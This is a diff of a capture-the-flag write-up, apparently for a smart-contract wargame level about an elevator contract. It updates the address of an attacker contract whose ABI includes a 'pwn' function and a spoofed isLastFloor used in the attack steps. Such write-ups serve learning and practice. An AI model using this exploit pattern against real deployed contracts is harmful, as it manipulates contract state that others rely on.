@@ -23,7 +23,7 @@ The input actually has no impact on the result.
 
 ```js
 abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"floor","type":"uint256"}],"name":"isLastFloor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"pwn","outputs":[],"stateMutability":"nonpayable","type":"function"}]';
-topple = new web3.eth.Contract(JSON.parse(abi), '0x570784E7748Df48b8fd8B3Ec5443F9A64d8e3FF3');
+topple = new web3.eth.Contract(JSON.parse(abi), '0x503c86d70539fE0ed1fb4a89f9FCa466272Eb613');
 // false
 await contract.top()
 // attack
